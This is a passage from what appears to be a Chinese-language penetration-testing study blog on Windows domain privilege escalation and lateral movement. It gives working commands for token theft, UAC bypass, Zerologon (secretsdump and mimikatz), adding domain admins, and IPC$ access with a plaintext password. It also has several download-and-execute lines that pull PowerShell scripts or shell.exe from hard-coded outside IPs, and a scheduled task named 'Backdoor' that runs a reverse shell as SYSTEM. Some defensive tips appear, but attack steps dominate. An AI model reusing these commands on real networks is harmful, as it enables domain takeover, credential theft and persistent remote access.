&lt;密码&gt; /ad /domain <span class="comment"># 添加域用户</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> &lt;用户名&gt; /ad /domain <span class="comment"># 把域用户添加到管理员组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当使用meterpreter的incognito模拟域管理员</span></span><br><span class="line">add_user_&lt;用户名&gt; &lt;密码&gt; -h &lt;主机iP&gt; <span class="comment"># 在域控主机添加一个账号</span></span><br><span class="line">add_group_user <span class="string">&quot;Domain admins&quot;</span> &lt;用户名&gt; -h &lt;主机iP&gt; <span class="comment"># 添加到管理员组</span></span><br></pre></td></tr></table></figure><p>防御方法</p><ul><li>及时安装补丁</li><li>对令牌时效性进行限制</li><li>对令牌采取加密存储和多重验证保护</li><li>使用加密链路<code>SSL/TLS</code>传输令牌，以防止中间人窃听</li></ul><h3 id="常规令牌窃取"><a href="#常规令牌窃取" class="headerlink" title="常规令牌窃取"></a>常规令牌窃取</h3><p>用于将管理员权限提升到<strong>SYSTEM</strong>、<strong>TrustdInstaller</strong>等更高的系统权限</p><ul><li><code>incognito.exe 可用于有杀毒、不出网、防火墙限制等无法cs或msf上线情况，但是需要管理员的权限运行</code></li></ul><p>上传到目标主机 <code>incognito.exe list_tokens_u</code> 列举主机上所有访问令牌</p><p><img src="image-20230313151559789.png" alt="image-20230313151559789"></p><p><code>incognite.exe excute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami</code>         -  c参数后为要窃取的令牌 whoami  窃取后要执行的命令</p><p><code>incognito.exe excute -c &quot;HACK-MY\MARCUS&quot; CMD</code>  窃取 Mrcus的访问令牌 实现本地管理员切换到域用户  </p><ul><li>msf</li></ul><p>他也有incognito模块   </p><ul><li>通过令牌获取 TrustInstaller权限</li></ul><p><code>icacls &quot;C:\Windows\servicing&quot; </code>查看目录权限 （此目录 即使拥有system权限也不能写入文件）</p><p><img src="image-20230313152230932.png" alt="image-20230313152230932"></p><blockquote><p>icacls查看目录权限</p></blockquote><p>Windows从Vistas开始内置TrustedInstaller安全主体 有修改系统文件的权限 用于对系统维护更新 它以一个帐户组的形式出现-NT SERVICE\TrustedInstaller</p><p>通常情况下可以通过窃取令牌获取TrustedInstaller权限 </p><p>TrustedInstaller本身也是一个服务 启动 运行 TrustedInstaller.exe  路径”C:\Windows\serivcing\TrustedInstaller.exe”</p><p>拥有者  NT SERVICE\TrustedInstaller 可以窃取此令牌提升至TrustedInstaller权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc start TrustedInstaller</span><br><span class="line">记录pid</span><br><span class="line">steal_token &lt;PID&gt;</span><br><span class="line">chcp 切换 utf-8 防止乱码 </span><br></pre></td></tr></table></figure><h3 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h3><p>通过操纵访问令牌 提升至SYSTEM权限</p><p>滥用   <code>SeImpersonatePrivilege</code>和<code>SeAssignPrimaryTokenPrivilege</code>俩也全 将SYSTEM令牌传入函数调用 从而在SYSTEM账户的上下文创建新进程 提升到SYSTEM 如果拿到了IIS等服务的Webshell 或者通过MSSQL服务的xp_cmdshell成功执行系统命令 此时有俩特权 就可以提升到SYSTEM权限</p><ul><li>Rotten Potato烂土豆</li></ul><p>1 通过api将一个com加载到本地可控端口 诱骗BITS对象以system账户身份发起NTLM认证</p><p>2.借助rpc135端口进行中间人攻击 生成访问令牌</p><p>3 通过令牌创建新进程</p><ul><li>Juicy Potato 烂土豆的扩展</li></ul><p>不依赖现有的Meterpreter</p><ul><li>PrintSpoofer(Pipe Potato)</li><li>Sweet Potato 甜土豆</li></ul><p>集成功能</p><h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h2><p>如果计算机的操作系统版本是<code>Windows Vista</code>或者更高，低权限访问敏感文件或者目录，需要经过UAC（User Account Control，用户账户控制）的认证才能进行</p><p>UAC简介</p><p>UAC是微软为了提高系统安全性引入的技术。UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。</p><p>需要UAC的授权才能进行的操作列举：</p><ul><li>配置<code>Windows Update</code></li><li>增加/删除账户</li><li>更改用户类型</li><li>更改UAC的设置</li><li>安装<code>ActiveX</code></li><li>安装/卸载程序</li><li>安装设备驱动程序</li><li>将文件移动/复制到<code>Program Files</code>或<code>Windows</code>目录下</li><li>查看其他用户文件夹</li></ul><p>UAC有四种设置：</p><ul><li>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限是都会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户</li><li>仅在程序识图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置的要求想用，但是提示用户是不降低桌面亮度</li><li>不提示：当用户为系统管理员时，所有程序都会以最高权限运行</li></ul><p>Uer Account Control 用户账户控制  UAC</p><p>可以阻止自动安装未授权应用</p><p>限制所有用户包括非 RID500的管理员（除了Administrator外）的操作 </p><p>如果可以绕过 UAC可以使非RID500的管理员账户可以不如要用户批准直接使用管理员访问令牌，获取全部管理权限</p><p>本质是绕过UAC的权限保护 本质上不能看做真正的提权</p><h3 id="UAC白名单"><a href="#UAC白名单" class="headerlink" title="UAC白名单"></a>UAC白名单</h3><p>设置了白名单 不再询问  可以对这些白名单中的程序进行DLL劫持 注入或注册表劫持</p><p>寻找白名单程序 <code>Sigcheck</code> <code>Strings </code> 白名单程序特性 Manifest数据库中 autoElevate属性为true</p><p>找到白名单程序A -&gt;使用Process Monitor监控进程操作行为-&gt;修改启动可以执行文件键值-&gt;再次执行该程序A</p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>很多程序不是完整的 被分割成dll文件 启动时有特定顺序搜索待加载dll 将同名恶意dll但放到合法dll之间的搜索位置 就会加载恶意dll</p><h3 id="模拟可信任目录"><a href="#模拟可信任目录" class="headerlink" title="模拟可信任目录"></a>模拟可信任目录</h3><p>根据可信任目录创建一个包含尾随空格的模拟可信任目录 将一个白名单程序复制到模拟可信任目录中 配合dll劫持绕过</p><h3 id="相关辅助工具"><a href="#相关辅助工具" class="headerlink" title="相关辅助工具"></a>相关辅助工具</h3><ul><li><p>UACME</p><p>AKAGI.EXE [KEY] [PARAM] </p><p>key指定绕过方法变好 param 指定绕过后的命令</p></li><li><p>msf</p></li></ul><p>​    bypassuac模块</p><p>​     使用<code>MSF</code>，当已经获得一个<code>meterpreter</code>时，运行<code>exploit/windows/local/bypassuac</code>，会获得一个新的<code>meterpreter shell</code>，这时已经绕过了UAC，获得了System权限，<strong>使用该模块必须，当前用户在管理员组，且UAC必须是默认设置</strong></p><p>​    该模块会在目标机器创建多个文件，会被杀软识别</p><p>​    RunAS模块</p><p>​       使用<code>exploit/windwos/local/ask</code>模块，创建一个可执行文件（需要免杀处理），在目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果选择是，就会返回一个高权限的<code>meterpreter shell</code></p><p>防御方法</p><ul><li>不让内部机器使用者拥有本地管理员权限</li><li>设置UAC为“始终通知”</li></ul><h2 id="用户凭据操作"><a href="#用户凭据操作" class="headerlink" title="用户凭据操作"></a>用户凭据操作</h2><h3 id="枚举Unattended凭据"><a href="#枚举Unattended凭据" class="headerlink" title="枚举Unattended凭据"></a>枚举Unattended凭据</h3><p>无人值守Unattended 允许自动安装</p><p>残留配置文件 可能包含本地管理员用户名密码</p><ul><li>C:\sysprep.inf</li><li>C:\sysprep\sysprep.inf</li><li>C:\Windows\system32\sysprep.inf</li><li>C:\Windows\system32\sysprep\sysprep.xml</li><li>C:\unattend.xml</li><li>C:\Windows\Panther\Unattend.xml</li><li>C:\Windows\Panther\Unattended.xml</li><li>C:\Windows\Panther\Unattend\Unattended.xml</li><li>C:\Windows\Panther\Unattend\Unattend.xml</li><li>C:\Windows\System32\Sysprep\unattend.xml</li><li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li></ul><p>里面大概率包含明文密码或者经过Base64加密的密码</p><p><code>MSF</code>的<code>post/windwos/gather/enum_unattend</code>模块集成自动检索</p><h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>简介</p><p><code>SYSVOL</code>是活动目录里面的一个用于存储域供供文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。它是在安装活跃目录时自动创建的，主要用于存放登录脚本，组策略数据及其他域控制器需要的域信息。<code>SYSVOL</code>在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。<strong>整个SYSVOL目录在所有的域控制器中式自动同步共享的，所有域策略均存放在C:\windwos\SYSVOL\DOMAIN\Policies\目录中</strong></p><p>通过组策略统一修改密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员面面，就相当于获得了整个域中所有机器的本地管理员密码</p><p>常见的组策略首选项：</p><ul><li>映射驱动器（Drives.xml）</li><li>创建本地用户</li><li>数据源（DataSources.xml）</li><li>打印机配置（Printers.xml）</li><li>创建/更新服务（Services.xml）</li><li>计划任务（ScheduledTasks.xml）</li></ul><p>获取组策略的凭据</p><p>管理员在域中新建一个组策略后，操作系统会自动在<code>SYSVOL</code>共享目录中生成一个XML文件，该文件中保存了改组策略更新后的密码。改密码使用AES-256加密算法。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。任何域用户和域信任用户均可对该共享目标进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其破解，从而控制域中所有使用该账号/密码的本地管理员计算机。在SYSVOL中搜素，可以找到包含<code>cpassword</code>的XML文件</p><p>查找cpassword文件</p><ul><li>手动查找SYSVOL文件夹</li><li>使用<code>PowerSploit</code>中的<code>Get-GPPPassword.ps1</code></li><li>使用<code>MSF</code>中的<code>post/windows/gather/credentials/gpp</code>模块</li></ul><p>防御方式</p><ul><li>安装<code>KB2962486</code>补丁，使用该补丁将不会将密码保存在组策略首选项中</li><li>设置共享文件夹SYSVOL的访问权限</li><li>将cpassword文件删除</li><li>不要将密码放在低权限能够访问的文件中</li><li>修改域中机器密码使用LAPS</li></ul><h2 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h2><p>CVE-2021-36934</p><ul><li>是否存在</li></ul><p>icacls “C:\Windows\System32\config\SAM”</p><p>输出 “BUILTIN\Users:(I)(RX)”则表示易受攻击</p><ul><li><p>将编译好的exe上传到主机 直接运行就可以将  SAM、SYSTEM、SECURITY文件转储到当前目录</p></li><li><p>三个文件复制到本地 使用Impacket 中的secretsdump.py导出用户哈希</p></li><li><p>之后可以爆破哈希 或者 哈希传递  </p></li></ul><h2 id="Zerologin域内提权"><a href="#Zerologin域内提权" class="headerlink" title="Zerologin域内提权"></a>Zerologin域内提权</h2><p>cve-2020-1472  Netlogon远程协议特权提升漏洞</p><p>调用Netlogon中的RPC函数重置域控密码 重置的是域控机器账户的密码 </p><p>机器账户不允许登陆 但默认有DCSync权限 可以导出域管哈希 从何获取域控权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.充值域控密码</span><br><span class="line">python3 cve.py DC-1 10.10.10.11</span><br><span class="line">python3 secretsdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my/administrator&quot; -no-pass</span><br><span class="line">然后哈希传递攻击 </span><br><span class="line">或者mimikatz</span><br><span class="line">mimikatz.exe &quot;lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:DC-1$/exploit&quot; exit </span><br><span class="line">/target指定域控地址 /account指定域控账户</span><br><span class="line">2.恢复域控密码</span><br><span class="line">不恢复会导致域控脱域 因为NTDS.DIT中存储密码和本地注册表存储密码不一致</span><br><span class="line">首先导出本地注册表值</span><br><span class="line">reg save HKLM/SYSTEM system.save</span><br><span class="line">reg save HKLM/SAM sam.save</span><br><span class="line">reg save HKLM/SECURITY security.save</span><br><span class="line">使用secretsdump.py导出哈希值</span><br><span class="line">secretsdump.py -sam sam.save -system system.save -secyrity security.save LOCAL</span><br><span class="line">然后运行cve中的restorepassword.py恢复域控密码</span><br><span class="line">python3  restorepassword.py hack-my.com/DC-1$@DC-1 -target-ip 10.10.10.11 -hexpassea4b</span><br><span class="line">或者mimikatz恢复</span><br><span class="line">lsadump::postzerologin /target:hack-my.com /account:DC-1$</span><br></pre></td></tr></table></figure><h2 id="Print-Spooler"><a href="#Print-Spooler" class="headerlink" title="Print Spooler"></a>Print Spooler</h2><p>系统打印后台处理服务 默认开启</p><h3 id="PrintDemon"><a href="#PrintDemon" class="headerlink" title="PrintDemon"></a>PrintDemon</h3><p>CVE-2020-1048 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 .MSF生成攻击载荷 并base64编码</span><br><span class="line">2以标准用户身份在目标主机powersploit执行poc</span><br><span class="line">#msf有这个cve模块可以直接提权</span><br></pre></td></tr></table></figure><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>CVE-2021-1675 提权</p><p>CVE-2021-34527 rce</p><h2 id="Nopac域内提权"><a href="#Nopac域内提权" class="headerlink" title="Nopac域内提权"></a>Nopac域内提权</h2><p>kerberos协议有关 待学习</p><h2 id="Certifred域内提权"><a href="#Certifred域内提权" class="headerlink" title="Certifred域内提权"></a>Certifred域内提权</h2><p>CVE-2022-26923</p><p>原理 域内主机绕过限制 安装AD 成为DC 获取域控最高权限 </p><h2 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h2><p>假设目标网络DNS服务器因故障无法服务可以使用<code>Responder</code>工具进行监听，它能够抓取网络中所有的LLMNR和NBT-NS请求并进行响应，获取最初的账户凭证</p><p>它还可以利用内置SMB、MSSQL、HTTP、HTTPS、LDAP、DNS、WPAD、FTP、POP3、LMAP、SMTP等认证服务器，收集目标计算机的凭证，还可以通过Multi-Relay功能在目标系统中执行命令</p><h1 id="Windows-Powershell-基础"><a href="#Windows-Powershell-基础" class="headerlink" title="Windows Powershell 基础"></a>Windows Powershell 基础</h1><p><strong>可以把PowerShell 当作是CMD的扩展，它可以执行一些脚本文件，极大的便利了内网渗透</strong></p><p><strong>优点：</strong></p><ul><li><p>在Windows 7 以上的版本默认安装</p></li><li><p>脚本可以在内存中运行，无需写入内存</p></li><li><p>几乎不会触发杀毒软件</p></li><li><p>可以远程执行</p></li><li><p>目前很多工具多是基于PowerShell开发的</p></li><li><p>使Windows脚本执行变得更加容易</p></li><li><p><code>cmd.exe</code>通常会被阻止，但是<code>PowerShell</code>的运行通常不会被阻止</p></li><li><p>可用于管理活跃目录</p></li></ul><p><strong>Windows版本对应的版本：</strong></p><table><thead><tr><th>win版本</th><th>PowerShell版本</th><th>是否可以升级</th></tr></thead><tbody><tr><td>win7/winServer 2008</td><td>2.0</td><td>3.0 / 4.0</td></tr><tr><td>win8 / winServer 2021</td><td>3.0</td><td>4.0</td></tr><tr><td>win8.1 / winServer2012R2</td><td>4.0</td><td>X</td></tr></tbody></table><ul><li><code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 查看版本</li></ul><p><img src="image-20220330095144552.png" alt="image-20220330095144552"></p><p><img src="image-20220330095234964.png" alt="image-20220330095234964"></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><code>Powershell</code>脚本文件的后缀是<code>.ps1</code></li></ul><h2 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h2><p>为了防止恶意脚本执行，提供了执行策略，默认策略是”不能运行”</p><ul><li><p>使用<code>Get-ExecutionPolicy</code>查看执行策略</p><ul><li><p><code>Restricted</code>：脚本不能执行（默认设置）</p></li><li><p><code>RemoteSigned:</code>在本地创建的脚本可以运行，网上下载的脚本不能运行（拥有数字签名的证书除外）</p></li><li><p><code>AllSigned:</code> 仅当脚本有受信任的发布者签名时才能运行</p></li><li><p><code>Unrestricted:</code>允许所有脚本运行</p></li></ul><p><img src="image-20220330100120858.png" alt="image-20220330100120858"></p></li><li><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code> 设置执行策略（需要管理员权限）</p></li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> &lt;目录名&gt; <span class="literal">-type</span> directory <span class="comment"># 新建目录</span></span><br><span class="line"><span class="built_in">New-Item</span> &lt;文件名&gt; <span class="literal">-type</span> file      <span class="comment"># 新建文件</span></span><br><span class="line"><span class="built_in">Remove-item</span> &lt;目录名/文件名&gt;        <span class="comment"># 删除目录或者文件</span></span><br><span class="line"><span class="built_in">Get-content</span> &lt;文件名&gt;              <span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="built_in">set-content</span> &lt;文件名&gt; <span class="literal">-value</span> <span class="string">&quot;文件内容&quot;</span> <span class="comment"># 覆盖写入文件内容</span></span><br><span class="line"><span class="built_in">add-content</span> &lt;文件名&gt; <span class="literal">-value</span> <span class="string">&quot;文件内容&quot;</span> <span class="comment"># 追加写入文件内容</span></span><br><span class="line"><span class="built_in">clear-content</span> &lt;文件名&gt;            <span class="comment"># 清空文件内容</span></span><br><span class="line"><span class="variable">$host</span>.version  <span class="comment"># 查看powershell版本</span></span><br><span class="line"><span class="built_in">set-location</span> &lt;绝对路径&gt; <span class="comment"># 设置路径</span></span><br><span class="line">powershell  <span class="comment"># cmd切换为powershell</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="operator">-file</span> .\<span class="number">1</span>.ps1  <span class="comment"># 绕过安全检测执行ps1文件</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-command</span> <span class="string">&quot;&amp;&#123;import-module &lt;被引入模块的绝对路径&gt;;&lt;引入模块的执行名称&gt;&#125;&quot;</span>     <span class="comment"># 在目标本地加载并执行</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-Nop</span> <span class="literal">-Noni</span>(<span class="built_in">New-Object</span> Net.webClient).DownloadString(<span class="string">&quot;&lt;远程脚本加载地址&gt;&quot;</span>); <span class="comment">#远程导入ps1脚本，绕过本地权限并执行，后面加执行参数就行了。</span></span><br></pre></td></tr></table></figure><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-exec</span> bypass(<span class="literal">-ExecutionPolicy</span> Bypass): 绕过安全执行策略。</span><br><span class="line"><span class="literal">-W</span> <span class="keyword">hidden</span> (<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>): 隐藏窗口</span><br><span class="line"><span class="literal">-Noni</span>(<span class="literal">-NonInteractive</span>): 非交互式。powershell不为用户提供交互式提示</span><br><span class="line"><span class="literal">-NoP</span>(<span class="literal">-NoProfile</span>): Powershell控制台不加载当前用户的配置文件</span><br><span class="line"><span class="literal">-noexit</span>：执行之后不退出shell，这个参数在使用键盘记录等脚本非常重要</span><br><span class="line"><span class="literal">-Nologo</span>：启动不显示版权标志的Powershell</span><br><span class="line"><span class="literal">-enc</span>: 解码base64,直接用在线的base64进行编码不可以，推荐使用下面的脚本，编码</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileContent</span> = <span class="string">&quot;&lt;需要编码的内容&gt;&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$fileContent</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure><p>powerup</p><p>正常导入ps1需要system 有system还提nml </p><p>所以使用下面的远程调用绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#x27;http://140.246.211.51:81/ps/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20230313180145381.png" alt="image-20230313180145381"></p><p>调用成功   </p><p>发现dll劫持  可以直接 做一个dll过去换掉 重启服务应该就是能行了 </p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="横移中的文件传输"><a href="#横移中的文件传输" class="headerlink" title="横移中的文件传输"></a>横移中的文件传输</h2><h3 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h3><p><code>net share</code>  ipc需要管理员权限呢</p><p><img src="image-20230315133646588.png" alt="image-20230315133646588"></p><p>实战往往中建立IPC$连接（不仅文件共享 还能进行其他远程管理）</p><p>建立IPC$的两个条件 1 主机开启IPC连接 2 主机开放 139和445</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">建立连接</span><br><span class="line">net use \\192.168.1.130\IPC$ &quot;c2316323798&quot; /user:&quot;windows10&quot;</span><br><span class="line">net use \\&lt;hostname&gt;\IPC$ &quot;&lt;password&gt;&quot; /user:&quot;&lt;username&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20230315134147404.png" alt="image-20230315134147404"></p><p>列出远程主机C盘共享目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.130\C$</span><br></pre></td></tr></table></figure><p><img src="image-20230315134345486.png" alt="image-20230315134345486"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\paleonec\Desktop\C6F56D1B9609ABCE104C2934DC7BB327.jpg \\192.168.1.130\C$</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问其他 共享也一样 </span><br><span class="line">net use \\192.168.1.130\C$ &quot;c2316323798&quot; /user:&quot;windows10&quot;</span><br></pre></td></tr></table></figure><blockquote><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="利用命令："><a href="#利用命令：" class="headerlink" title="利用命令："></a>利用命令：</h3><ul><li><code>net use \\&lt;目标IP&gt;\ipc$ &quot;&lt;密码&gt;&quot; /user:&lt;用户名&gt;</code>  进行IPC连接</li><li><code>net use</code> 查看连接信息</li><li><code>net use E: \\&lt;目标IP&gt;\C$</code> 把目标C盘映射到本地E盘</li><li><code>net use E: /del</code> 删除磁盘映射</li></ul><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><p><code>IPC$</code>可以实现远程登陆及对默认共享资源的访问，而139端口的开启表示<code>NetBIOS</code>协议的应用。通过139、445端口，可以实现对共享文件/打印机的访问。因此，一般来说，<code>IPC$</code>需要139、445端口的支持。</p><h3 id="连接失败原因"><a href="#连接失败原因" class="headerlink" title="连接失败原因"></a>连接失败原因</h3><ul><li>用户名密码错误</li><li>目标没有打开ipc$共享</li><li>不能成功连接目标的139、445端口</li><li>命令输入错误</li></ul><h3 id="常见错误号"><a href="#常见错误号" class="headerlink" title="常见错误号"></a>常见错误号</h3><ul><li>错误号5：拒绝访问</li><li>错误号51：Windows无法找到网络路径，即网络中存在问题</li><li>错误号53：找不到网络路径，包括IP地址错误、目标未开机、目标的lanmanserver服务未启动、目标有防火墙</li><li>错误号67：找不到网络名，包括lanmanworkstation服务未启动，ipc$已被删除</li><li>错误号1219：提供的凭据和已存在的凭据集冲突</li><li>错误号1326：未知的用户名密码</li><li>错误号1792：试图登录，但网络登录服务没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况）</li><li>错误号2242：此用户名密码已过期。例如目标机器设置了账号管理策略，强制修改密码</li></ul><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><p>使用以下命令的前提时建立了ipc$连接</p><ul><li><code>dir \\&lt;目标IP&gt;\c$</code>，列出远程主机C盘文件</li><li><code>tasklist /S &lt;目标IP&gt; /U &lt;用户名&gt; /P &lt;密码&gt;</code>  列出远程主机的进程</li><li><code>type \\&lt;目标IP&gt;\&lt;绝对路径&gt;</code>  读取远程主机文件</li></ul></blockquote><h3 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h3><p>smb 服务器消息块 又称网络文件共享系统 基于应用层 </p><p>一般使用NetBIOS协议或者TCP 分别使用139或445</p><p>实战中可以 在vps或受控内网机搭建smb 将文件放入共享目录 指定UNC路径 让目标远程加载SMB共享文件 需要使用SMB 匿名共享 且搭建的服务器能被访问</p><p>Linux 通过Impacket提供的smbserver.py搭建 </p><p>Windows如果有管理员权限 可以手动配置smb匿名共享 也可以通过 Invoke-BuildAnoymouSMBServer在本地快速启动匿名共享</p><h3 id="Windows自带工具"><a href="#Windows自带工具" class="headerlink" title="Windows自带工具"></a>Windows自带工具</h3><h4 id="Certuil"><a href="#Certuil" class="headerlink" title="Certuil"></a>Certuil</h4><p>提供了从网络中下载文件的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://IP:PORT/shell.exe C:\reverse_tcp.exe</span><br><span class="line">certutil -urlcache -split -f  下载地址      保存文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20230315143512748.png" alt="image-20230315143512748"></p><p>本地   检测会被火绒/Defender拦  </p><p><img src="image-20230315143348043.png" alt="image-20230315143348043"></p><h4 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h4><p>win7以后自带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:PORT/shell.exe C:\reverse_tcp.exe</span><br><span class="line">创建一个名为test的bitsadmin任务 </span><br></pre></td></tr></table></figure><p><img src="image-20230315143956762.png" alt="image-20230315143956762"></p><p>不好使 傻逼工具 不是system用不了  </p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>参考远程加载执行的思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://123.249.22.36/1.py&#x27;,&#x27;evil.py&#x27;)</span><br><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</li><li>ftp 等等 </li></ul><h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><h4 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h4><p>可以通过已有的IPC 在远程主机上创建计划任务 让目标主机定时或周期执行页数操作 在管理员权限下 通过计划任务横移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1利用已建立的共享连接 传马</span><br><span class="line">2利用已建立的共享连接创建计划任务</span><br><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</span><br><span class="line">/S:指定连接系统 